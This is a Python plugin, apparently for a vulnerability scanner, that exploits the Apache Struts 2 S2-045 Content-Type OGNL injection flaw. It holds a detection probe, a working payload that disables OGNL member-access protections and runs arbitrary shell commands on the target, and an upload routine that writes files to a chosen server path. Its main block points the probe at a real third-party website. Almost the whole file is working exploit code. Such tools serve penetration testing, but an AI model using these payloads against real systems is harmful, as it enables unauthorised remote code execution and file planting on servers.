#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

def info(data=None):
    info = {
        "name": "Struts 2-045",
        "info": "Struts 2-045.",
        "level": "high",
        "type": "rce",

    }
    return info


def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        try:
            headers = {}
            headers["Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
            res = curl('get',data['url'],headers = headers)
            if res.headers['header_str2045'] == 'header_str2045_multipart':
                data['flag'] = 1
                data['data'].append({"headers":headers})
                data['res'].append({"info": data['url'], "key": "header_str2045"})
        except:
            pass
    return data

def exec(data):
    data = init(data, 'struts')
    if data['url'] != None:
        cmd = data['cmd'] if 'cmd' in data.keys() else  'whoami'
        headers = {}
        headers["Content-Type"] = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('%COMMAND%'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}".replace("%COMMAND%",cmd)
        try:
            content = curl('get',data['url'],headers = headers).content
            data['flag'] = 1
            data['data'].append({"headers": headers})
            data['res'].append({"info": content,"key":cmd})
        except:
            pass
    return data

def upload(data):
    data = init(data, 'struts')
    if data['url'] != None:
        if 'srcpath' not in data.keys() :
            raise Exception("None srcpath ")
        if 'despath' not in data.keys() :
            raise Exception("None despath ")
        despath = data['despath']
        content = _read_file(data['srcpath'])
        headers = {}
        headers["Content-Type"] = """%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#fs=new java.io.FileOutputStream("%PATH%")).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/')).(#out.print(#req.getContextPath())).(#out.close())}""".replace("%PATH%", despath).replace("%FILECONTENT%", content)
        try:
            curl('get',data['url'],headers = headers)
            data['flag'] = 1
            data['data'].append({"headers": headers})
            data['res'].append({"info": data['despath'],"key":'upload'})
        except:
            pass
    return data

def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))